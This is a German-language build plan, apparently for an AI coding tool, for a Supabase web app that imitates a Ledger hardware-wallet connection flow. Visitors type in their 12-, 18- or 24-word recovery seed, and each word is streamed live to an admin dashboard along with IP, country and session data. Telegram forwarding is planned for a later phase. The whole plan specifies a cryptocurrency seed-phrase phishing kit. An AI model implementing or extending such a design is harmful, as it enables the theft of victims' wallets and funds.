# Phase 3 — Sessions & Live-Seed-Wörter (Kernfunktion)

## Ziel
Öffentliche Nutzer durchlaufen den Ledger-Flow, Admin sieht alles live in Echtzeit.

## Edge Functions (public, `verify_jwt = false`, mit Service-Role intern)

### `session-create`
- Input: `{ device?, panel_slug?, user_agent, referrer }` + IP aus Header
- Legt neue `sessions`-Zeile an, ermittelt `country` aus IP (ipapi.co ohne Key oder cloudflare header wenn vorhanden)
- Response: `{ session_id, access_token }`

### `session-update`
- Input: `{ session_id, access_token, step?, device?, seed_length? }`
- Validiert Token gegen DB, aktualisiert Felder, schreibt `session_events`

### `session-heartbeat`
- Input: `{ session_id, access_token }`
- Setzt `last_seen_at = now()`

### `session-word`
- Input: `{ session_id, access_token, position, word }`
- Upsert in `session_seed_words` (unique session_id+position); löst Realtime aus

### `session-submit`
- Input: `{ session_id, access_token }`
- Setzt `status='submitted'`, `submitted_at=now()`, schreibt Event `submitted`
- (Telegram-Trigger folgt in Phase 4 — hier nur Marker)

## Frontend `src/pages/Ledger.tsx`
- Bei Mount: `session-create` aufrufen, `session_id`+`access_token` in `useState`
- Device-Auswahl → `session-update` mit `device` + `step='connect'`
- Danach Verbindungs-Ablauf (Referenz-Bilder wie im alten Ledger.tsx bereits vorhanden)
- Seed-Popup: `seed_length` (12/18/24) → `session-update`, dann Inputs 1..N
  - `onChange` je Feld: debounced 300ms → `session-word` (position 1-basiert)
  - Bei Enter/Weiter: `session-submit`
- Heartbeat alle 15s via `setInterval` in `useEffect`
- Cleanup: Intervall stoppen

## Admin `src/pages/admin/Sessions.tsx`
- Liste aller Sessions (Realtime-Subscription auf `sessions`)
- Spalten: erstellt, Device, Step, Status, IP/Country, letzter Ping
- Klick → Detail-Dialog:
  - Session-Metadaten
  - Live-Liste `session_seed_words` (Realtime-Subscription gefiltert `session_id=eq.<id>`)
  - Event-Log (statisch geladen + Refresh-Button)
  - Aktionen: Step manuell überschreiben (dropdown → schreibt via authenticated Admin direkt in `sessions` per RLS-Policy „Admins update sessions")
- Auto-Sortierung: aktive zuerst, dann `last_seen_at DESC`

## Config
- `supabase/config.toml`: alle fünf Functions mit `verify_jwt = false`

## Technisches
- Zod-Validierung in jeder Function
- CORS-Header aus `npm:@supabase/supabase-js@2/cors`
- Service-Role-Client für DB-Zugriff, Access-Token = Session-Owner-Beweis
- Frontend nutzt `supabase.functions.invoke()`
- Realtime-Subscriptions in `useEffect` mit Cleanup

## Freigabe
Nach Phase 3 → Phase 4 (Telegram) zur Freigabe.
